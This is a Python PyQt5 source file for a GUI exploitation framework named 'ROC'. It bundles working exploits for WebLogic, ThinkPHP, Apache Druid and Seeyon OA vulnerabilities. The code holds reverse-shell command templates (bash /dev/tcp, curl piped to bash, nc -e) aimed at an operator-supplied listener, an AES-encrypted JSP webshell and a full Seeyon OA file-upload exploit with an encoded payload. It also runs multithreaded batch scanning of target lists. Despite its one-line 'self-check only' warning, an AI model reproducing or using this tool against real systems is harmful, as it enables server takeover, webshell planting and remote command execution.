#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/6/26 5:51 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : run-main.py
# @Software: PyCharm


import sys
import os
import logging
import jpype
from datetime import datetime
import threading
import OperatingUi
import hashlib
from threading import Thread
from PyQt5.QtCore import pyqtSignal, QObject
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog
from controller import rocCheckController, rocCommandController, rocUploadFileController, rocReboundController
from PyQt5.QtWidgets import QMessageBox
from database.SQLite_tools import SQLite_tools
from linkage.linkage.linkage import linkAllAge
import requests
import time, random
from PyQt5 import QtCore
from random import choice


# 取消SSL证书错误告警
requests.packages.urllib3.disable_warnings()


def getTime():
    """
    :param message:时间戳 设置
    :return:当前时间
    """
    now = datetime.now()
    return now.strftime('%H:%M:%S')


def showSuccess(message):
    """
    :param message:设置输出样式,带有彩色样式标记
    :return:无返回值
    """
    print('[\033[1;94m{}\033[0;m] [\033[1;92m+\033[0;m] \033[1;92m{}\033[0;m'.format(getTime(), message))


class MainWindow(QMainWindow, QObject):
    send_args = pyqtSignal(str, int)
    send_sing = pyqtSignal(str)
    commandBasicInfo = pyqtSignal(str)  # 命令执行结果信号获取
    textEditinfo = pyqtSignal(str)
    textEditinfo_2 = pyqtSignal(str)
    status_textEdit = pyqtSignal(str)

    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.ui = OperatingUi.Ui_MainWindow()
        self.ui.setupUi(self)
        self.commandBasicInfo.connect(self.handleDisplayCommand)
        self.textEditinfo.connect(self.handlestatusOne)
        self.textEditinfo_2.connect(self.handlestatusOne_2)
        self.status_textEdit.connect(self.status_text)
        self.currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        self.event_obj = threading.Event()

    # ui 变化处理
    def handle_ui_change(self):
        self.ui.tabWidget.tabBar().setVisible(False)
        # pass

    # 所有button的消息与槽的通信
    def handle_buttons(self):
        self.ui.treeWidget.clicked.connect(self.onTreeClicked)

    # 选项卡的联动
    def vul_weblogic(self):
        self.ui.tabWidget.setCurrentIndex(0)

    def setupFunction(self):

        items = ["/bin/bash -i >& /dev/tcp/ip/port 0>&1", "curl ip:port | bash", "nc ip port -e /bin/bash"]
        self.ui.reboundCombo.addItems(items)
        commanditems = ["whoami", "ifconfig",
                        "netstat -an", "id"]
        self.ui.commandCombo.addItems(commanditems)
        command_3items = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17",
                          "18", "19", "20", ]
        self.ui.threads_num.addItems(command_3items)

        self.ui.startCheckButton.clicked.connect(self.startBatchCheck)  # 页面1
        self.ui.startCheckButton_2.clicked.connect(self.startBatchCheck_2) # 页面2

        self.ui.emptyButton.clicked.connect(self.clearResult)
        self.ui.commondButton.clicked.connect(self.execcommandPayload)
        self.ui.uploadFilesbutton.clicked.connect(self.startUploadFile)
        self.ui.importButton.clicked.connect(self.openfile)
        self.ui.importButton_2.clicked.connect(self.openfile) # 页面2批量检测

        self.ui.CheckButton.clicked.connect(self.execCheckPayload)
        self.ui.CheckButton_2.clicked.connect(self.execCheckPayload_2)  # 页面2检测
        self.ui.reboundButton.clicked.connect(self.startExecReb)
        self.ui.stopCheckButton.clicked.connect(self.stopBatchCheck)
        self.ui.decVule.clicked.connect(self.decGzipVale)  # 页面2 解码解压按钮
        self.ui.uploadFilesbutton_2.clicked.connect(self.uploadfile_2)  # 页面2 压缩编码按钮

        # 导航展示功能
        _translate = QtCore.QCoreApplication.translate
        sql = SQLite_tools()
        sql.create_SQL('./database/db/database.db')
        data = sql.get_SQLtable_column_parent_id('roc_nav_exploit', 'vul_name', 0)

        for vul_name in data:
            topLevel = sql.get_SQLtable_vul_name_top_level_item_id('roc_nav_exploit', '{0}'.format(vul_name))
            self.ui.treeWidget.topLevelItem(topLevel).setText(0, _translate("MainWindow", "{0}".format(vul_name)))

        data = sql.get_SQLtable_column_parent_id('roc_nav_exploit', 'vul_name', 1)

        for vul_name in data:
            child_id = sql.get_SQLtable_vul_name_child_id('roc_nav_exploit', '{0}'.format(vul_name))
            topLevel = sql.get_SQLtable_vul_name_top_level_item_id('roc_nav_exploit', '{0}'.format(vul_name))
            try:
                self.ui.treeWidget.topLevelItem(topLevel).child(child_id).setText(0,
                                                                                  _translate("MainWindow",
                                                                                             "{0}".format(vul_name)))
            except Exception:
                pass

        self.run_add_poc()
        self.save_data()

        basicTxt = '''
警告：本工具为漏洞自查工具，请勿非法攻击他人网站！
ROC漏洞综合利用框架采用动态加载配置文件
集成情况：
CVE_2017_3248_weblogic 检测 可用
CVE_2017_10271_weblogic 检测 命令执行 反弹shel 文件上传 可用
CVE_2019_2725_weblogic_10_3_6 检测 命令执行 反弹shell 文件上传 可用
CVE_2019_2729_weblogic_01 检测 命令执行 反弹shell 可用
CVE-2020-14882_weblogic_12_1_3 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.0.10_RCE 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.0.21_RCE 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.0.21_RCE_bypass_01 检测 命令执行 反弹shell 文件上传 可用（来源:柠檬菠萝）
Thinkphp5.0.22_RCE 检测 命令执行 反弹shell 文件上传 可用（来源:柠檬菠萝）
Thinkphp5.0.22_RCE_bypass_01 检测 命令执行 反弹shell 文件上传 可用（来源:柠檬菠萝）
Thinkphp5.0.23_RCE 检测 命令执行 反弹shell 文件上传 可用
Thinkphp5.1.29_RCE 检测 命令执行 反弹shell 文件上传 可用
2021-2-2 APACHE DRUID RCE EXP (CVE-2021-25646) 反弹功能已经集成
感谢ver007建议POC、EXP采用加载配置文件

后续持续开发
        '''
        self.ui.basicInfoTextEdit.setText(basicTxt)
        self.ui.filePathEdit_2.setText("../webapps/seeyon/")
        self.ui.filename.setText("bak.jspx")
        data = """<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>"""
        self.ui.commandBasicInfoTextEdit_2_2.setText(data)

    def uploadfile_2(self):
        targetAddr = self.ui.targetlineEdit_2.text()
        payload = self.ui.payloadCombo_2.currentText()  # 获取漏洞Payload
        shellPath = self.ui.filePathEdit_2.text()
        shellContent = self.ui.commandBasicInfoTextEdit_2.toPlainText()
        shellFilename = self.ui.filename.text()
        # getBasePathData = rocUploadFileController.rocUploadFileController.runGetBasePath(self, targetAddr, payload,
        #                                                                                  command="set")
        if payload == "致远OA_ajaxAction_formulaManager_文件上传漏洞":
            try:
                jvmPath = jpype.getDefaultJVMPath()
                getCurPath = os.getcwd()
                classPath = getCurPath + "/jarpackage/rocky.jar"
                try:
                    jpype.startJVM(jvmPath, "-ea", "-Djava.class.path={}".format(classPath))
                except:
                    pass
                JYDClass = jpype.JClass("com.rocky.SeeyouDecode")
                result = JYDClass.gzipData(shellPath,shellContent,shellFilename)
                USER_AGENTS = [
                    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
                    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
                    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
                ]
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                payload = '''managerMethod=validate&arguments={}'''.format(result)

                try:
                    check_url = targetAddr + '/seeyon/thirdpartyController.do.css/..;/ajax.do'
                    vul_url = targetAddr + '/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip'
                    headers["User-Agent"] = choice(USER_AGENTS)
                    res = requests.get(check_url, headers=headers, timeout=8)
                    if "java.lang.NullPointerException:null" in res.text:
                        r = requests.post(vul_url, headers=headers, timeout=10, data=payload)
                        if '"message":null' in r.text:
                            result = targetAddr + '/seeyon/{}'.format(shellFilename)
                            data = "[+] 文件上传成功,webshell地址为:{}".format(result)
                            self.textEditinfo_2.emit('{}'.format(data))
                except:
                    pass
                data = "压缩编码代码如下:{0} {1}".format(result, self.currentTime)
                self.textEditinfo_2.emit('{}'.format(data))
            except:
                data = "输入有误！！！ {}".format(self.currentTime)
                self.textEditinfo_2.emit('{}'.format(data))

    def decGzipVale(self):
        """
        执行解码解压
        :return:
        """
        payload = self.ui.payloadCombo_2.currentText()  # 获取漏洞Payload
        if payload == "致远OA_ajaxAction_formulaManager_文件上传漏洞":
            try:
                content = self.ui.commandBasicInfoTextEdit_4_2.toPlainText()
                jvmPath = jpype.getDefaultJVMPath()
                getCurPath = os.getcwd()
                classPath =  getCurPath + "/jarpackage/rocky.jar"
                try:
                    jpype.startJVM(jvmPath,"-ea","-Djava.class.path={}".format(classPath))
                except:
                    pass
                JYDClass = jpype.JClass("com.rocky.SeeyouDecode")
                result = JYDClass.decodeGzip(content)
                data = "解码解压代码如下:{0} {1}".format(result,self.currentTime)
                self.textEditinfo_2.emit('{}'.format(data))
            except:
                data = "输入有误！！！ {}".format(self.currentTime)
                self.textEditinfo_2.emit('{}'.format(data))

    def run_add_poc(self):
        """
        导航栏选项卡联动索引0
        :return:
        """
        self.ui.add_nav_index_data_Button.clicked.connect(self.execAddNavIndex)

    def execAddNavIndex(self):
        """
        多线程执行添加漏洞利用导航索引名称
        :return:
        """
        thread = Thread(target=self.addNavIndex)
        thread.start()

    def addNavIndex(self):

        """
        根据前端VIEW获取的导航索引名称插入到数据库里面
        :return:
        """
        vul_line_data = self.ui.vul_lineEdit.text()  # 获取导航栏漏洞利用索引名称
        vul_line_page = self.ui.vul_indexpage_lineEdit.text()
        vul_hash_data = hashlib.md5(b'!@#$').hexdigest() + str(getTime().encode('utf-8')) + str(random.randint(0, 9))
        vul_hash = hashlib.md5(str(vul_hash_data).encode("utf-8")).hexdigest()

        sql = SQLite_tools()
        sql.create_SQL('./database/db/database.db')
        sql.get_SQLtable_column_name('roc_nav_exploit')
        data = sql.get_SQLtable_vul_name_row('roc_nav_exploit', '{0}'.format(vul_line_data))

        if data:
            self.status_textEdit.emit('[+] 添加失败,数据已存在 {0}'.format(self.currentTime))
        else:
            sql.add_roc_nav_exploit_data(vul_line_data, vul_line_page, vul_hash)
            self.status_textEdit.emit('[+] 添加成功 {0}'.format(self.currentTime))

    def status_text(self, data):
        self.ui.status_textEdit.append(data)

    def msg(self):
        reply = QMessageBox.information(self,  # 使用infomation信息框
                                        "标题",
                                        "消息",
                                        QMessageBox.Yes | QMessageBox.No)

    def save_data(self):
        """
        保存请求数据到数据库
        :return:
        """
        # self.ui.save_Button.clicked.connect(self.savaReqData)

    def savaReqData(self):
        """
        保存数据到数据库
        :return:
        """
        vul_name = self.ui.vul_name_lineEdit.text()  # 漏洞名称
        vul_number = self.ui.vul_number_lineEdit.text()  # 漏洞编号
        author = self.ui.author.text()  # 提交作者
        items = [
            "GET", "POST"
        ]
        method_data = self.ui.method_Combo.addItems(items)  # 请求方法
        is_jump_checkBox = self.ui.jump_checkBox.isChecked()  # 是否跳转
        uri_lineEdit = self.ui.uri_lineEdit.text()  # 测试url
        timeout_data = self.ui.timeout_lineEdit.text()  # 请求超时
        verify_data = self.ui.verify_lineEdit.text()  # https
        header_data = self.ui.headerTextEdit.toPlainText()  #
        post_data = self.ui.postTextEdit.toPlainText()  #
        resp_var = self.ui.var_lineEdit.text()  # 响应变量

    def onTreeClicked(self):
        '''
        链接选项卡
        :return:
        '''
        item = self.ui.treeWidget.currentItem().text(0)
        # print(item)
        link_data = linkAllAge()
        data = link_data.runlink(item)
        self.ui.tabWidget.setCurrentIndex(int(data))
        QApplication.processEvents()
        vul_number_data = link_data.vul_number_options(item)  # 每个框架漏洞编号集合
        print(vul_number_data)
        ##判断下拉
        if '致远OA_ajaxAction_formulaManager_文件上传漏洞' in vul_number_data:
            self.ui.payloadCombo_2.clear()
            self.ui.payloadCombo_2.addItems(vul_number_data)
            print(1)
        else:
            self.ui.payloadCombo.clear()  # 清空下拉框数据
            self.ui.payloadCombo.addItems(vul_number_data)

    def handleDisplayCommand(self, data):
        """
        显示到ui命令执行后返回的结果信号
        :param data:
        :return:
        """
        self.ui.commandBasicInfoTextEdit.setText(data)

    def handleDisplay(self, data):
        self.ui.commandBasicInfoTextEdit_3.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.commandBasicInfoTextEdit_3.textCursor()
        self.ui.commandBasicInfoTextEdit_3.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatusOne(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatusOne_2(self, data):  # 在页面2显示信息
        self.ui.textEdit_2_2.append(data)
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatus(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.textEdit.textCursor()
        self.ui.textEdit.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def checkPayload(self, targetAddr, payload):
        '''
        检测payload方法
        :return:
        '''
        if "___" in payload:
            _translate = QtCore.QCoreApplication.translate
            sql = SQLite_tools()
            sql.create_SQL('./database/db/database.db')
            data = sql.get_SQLtable_vul_hash('vul_number_relation', '{0}'.format(payload))
            vul_hash = "".join(data)
            data = sql.get_SQLtable_vul_number('vul_number_relation', '{0}'.format(vul_hash))
            for payload in data:
                if "___" not in payload:
                    data = rocCheckController.rocCheckController.runCheck(self, targetAddr, payload)
                    self.textEditinfo.emit('{}'.format(data['data']))
                else:
                    pass
        else:
            data = rocCheckController.rocCheckController.runCheck(self, targetAddr, payload)
            self.textEditinfo.emit('{}'.format(data['data']))


    def checkPayload_2(self,targetAddr, payload):
        '''
        检测payload方法
        :return:
        '''

        if payload == "致远OA_ajaxAction_formulaManager_文件上传漏洞":
            USER_AGENTS = [
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
                "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
                "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
            ]
            headers = {"Content-Type": "application/x-www-form-urlencoded"}

            payload = '''managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00'''

            try:
                check_url = targetAddr + '/seeyon/thirdpartyController.do.css/..;/ajax.do'
                vul_url = targetAddr + '/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip'
                headers["User-Agent"] = choice(USER_AGENTS)
                res = requests.get(check_url, headers=headers, timeout=8)
                if "java.lang.NullPointerException:null" in res.text:
                    r = requests.post(vul_url, headers=headers, timeout=10, data=payload)
                    if '"message":null' in r.text:
                        result = targetAddr + '/seeyon/SeeyonUpdate1.jspx'
                        status_data = '[+]{} is vulnerable! {} {}'.format(targetAddr, payload, self.currentTime)
                        self.textEditinfo_2.emit(status_data)
                    else:
                        status_data = '[-]{} is unvulnerable! {} {}'.format(targetAddr, payload, currentTime)
                        self.textEditinfo_2.emit(status_data)
            except:
                data = "输入有误！！！,请求超时！ {}".format(self.currentTime)
                self.textEditinfo_2.emit('{}'.format(data))

    def commandPayload(self):
        """
        利用payload命令执行
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr
        payload = self.ui.payloadCombo.currentText()
        command = self.ui.commandCombo.currentText()
        data = rocCommandController.rocCommandController.runCommand(self, targetAddr, payload, command)
        if data['type'] == 'status':
            self.textEditinfo.emit('{}'.format(data['data']))
        elif data['type'] == 'content':
            self.commandBasicInfo.emit('{}'.format(data['data']))
        else:
            self.textEditinfo.emit('type错误')

    def execRebound(self):
        """
        反弹shell
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr
        payload = self.ui.payloadCombo.currentText()  # 获取payload编号
        lhost = self.ui.lipaddrlineEdit.text()
        print(lhost)
        lport = self.ui.lport.text()
        print(lport)
        rebound = self.ui.reboundCombo.currentText()

        if rebound == 'curl ip:port | bash':
            reboundData = r'curl {}:{} | bash'.format(lhost, lport)
        elif rebound == '/bin/bash -i >& /dev/tcp/ip/port 0>&1':
            reboundData = r'/bin/bash -i > /dev/tcp/{}/{} 0<&1 2>&1'.format(lhost, lport)
        elif rebound == 'nc ip port -e /bin/bash':
            reboundData = r'nc {} {} -e /bin/bash'.format(lhost, lport)
        else:
            return '操作错误'
        data = rocReboundController.rocReboundController.runRebound(self, targetAddr, payload, reboundData)
        self.textEditinfo.emit('{}'.format(data['data']))

    def execbackendCheck(self, event):
        """
        执行批量检测
        :return:
        """
        thread_num = int(self.ui.threads_num.currentText())  # 获取线程数
        payload = self.ui.payloadCombo.currentText()  # 获取漏洞Payload
        targetTxtPath = self.ui.importFilePath.text()  # 获取导入文件路径

        print(event.isSet())
        event.wait()
        with open(targetTxtPath, "r") as targetTxtPath:
            url_list = [i.replace("\n", "") for i in targetTxtPath.readlines()]
        sem = threading.Semaphore(thread_num)

        for url in url_list:
            t = threading.Thread(target=self.backendCheckThread, args=(sem, url, payload, event))
            t.start()
            time.sleep(0.1)
        while threading.active_count() != 1:
            pass  # print threading.active_count()
        else:
            print('### Selenium Jobs is over!!!###')

    def execbackendCheck_2(self, event):
        """
        执行批量检测
        :return:
        """
        thread_num = int(self.ui.threads_num.currentText())  # 获取线程数
        payload = self.ui.payloadCombo.currentText()  # 获取漏洞Payload
        targetTxtPath = self.ui.importFilePath.text()  # 获取导入文件路径

        print(event.isSet())
        event.wait()
        with open(targetTxtPath, "r") as targetTxtPath:
            url_list = [i.replace("\n", "") for i in targetTxtPath.readlines()]
        sem = threading.Semaphore(thread_num)

        for url in url_list:
            t = threading.Thread(target=self.backendCheckThread_2, args=(sem, url, payload, event))
            t.start()
            time.sleep(0.1)
        while threading.active_count() != 1:
            pass  # print threading.active_count()
        else:
            print('### Selenium Jobs is over!!!###')

    def backendCheckThread(self, sem, url, payload, event):
        sem.acquire()  # 注意要第一时间去修改计数器 这点很重要
        try:
            event.wait()
            self.checkPayload(url, payload)
        except Exception as ErrorInfo:
            print(ErrorInfo)
        finally:
            sem.release()

    def backendCheckThread_2(self, sem, url, payload, event):
        sem.acquire()  # 注意要第一时间去修改计数器 这点很重要
        try:
            event.wait()
            self.checkPayload_2(url, payload)
        except Exception as ErrorInfo:
            print(ErrorInfo)
        finally:
            sem.release()

    def uploadfile(self):
        """
        上传文件
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()
        payload = self.ui.payloadCombo.currentText()
        filepath = self.ui.filePathEdit.text()
        checkBox = self.ui.checkBox.text() if self.ui.checkBox.isChecked() else ''
        content = self.ui.commandBasicInfoTextEdit_2.toPlainText()
        getBasePathData = rocUploadFileController.rocUploadFileController.runGetBasePath(self, targetAddr, payload,
                                                                                         command="set")
        filepathAll = getBasePathData['data']
        print(filepathAll)

        data = rocUploadFileController.rocUploadFileController.runUploadFile(self, targetAddr, payload, filepathAll,
                                                                             checkBox, content, filepath)
        self.textEditinfo.emit('{}'.format(data['data']))

    def batchCheck(self):
        """
        批量检测这一类的漏洞，并返回存在问题的漏洞编号
        :return:
        """
        return ''

    def execCheckPayload(self):
        """
        多线程执行检测，防止ui卡死
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()  # 获取1页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr

        payload = self.ui.payloadCombo.currentText()
        thread = Thread(target=self.checkPayload, args=(targetAddr, payload))
        thread.start()

    def execCheckPayload_2(self):
        """
        多线程执行检测，防止ui卡死
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()  # 获取1页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr

        payload = self.ui.payloadCombo.currentText()
        thread = Thread(target=self.checkPayload_2, args=(targetAddr, payload))
        thread.start()

    def execcommandPayload(self):
        """
        多线程执行命令，防止ui卡死
        :return:
        """
        thread = Thread(target=self.commandPayload)
        thread.start()

    def startExecReb(self):
        """
        多线程执行反弹，防止ui卡死
        :return:
        """
        thread = Thread(target=self.execRebound)
        thread.start()

    def startUploadFile(self):
        """
        多线程执行文件上传，防止ui卡死
        :return:
        """
        thread = Thread(target=self.uploadfile)
        thread.start()

    def startBatchCheck(self):
        """
        多线程批量检测漏洞,防止
        :return:
        """
        # 创建一个事件
        self.event_obj.clear()
        self.event_obj.set()
        thread = Thread(target=self.execbackendCheck, args=(self.event_obj,))
        thread.start()

    def startBatchCheck_2(self):
        """
        多线程批量检测漏洞,防止
        :return:
        """
        # 创建一个事件
        self.event_obj.clear()
        self.event_obj.set()
        thread = Thread(target=self.execbackendCheck_2, args=(self.event_obj,))
        thread.start()

    def stopBatchCheck(self):
        """
        停止批量检测漏洞
        :return:
        """
        self.event_obj.clear()

    # 打开文件
    def openfile(self):
        fileName1, filetype = QFileDialog.getOpenFileName(self,
                                                          "选取文件",
                                                          "./",
                                                          "All Files (*);;Text Files (*.txt)")  # 设置文件扩展名过滤,注意用双分号间隔

        return self.ui.importFilePath.setText(fileName1)

    def clearResult(self):
        self.ui.textEdit.clear()


if __name__ == '__main__':
    QApplication.processEvents()
    time.sleep(1)
    app = QApplication(sys.argv)
    win = MainWindow()
    win.handle_buttons()
    win.handle_ui_change()
    win.setupFunction()
    win.show()
    sys.exit(app.exec_())
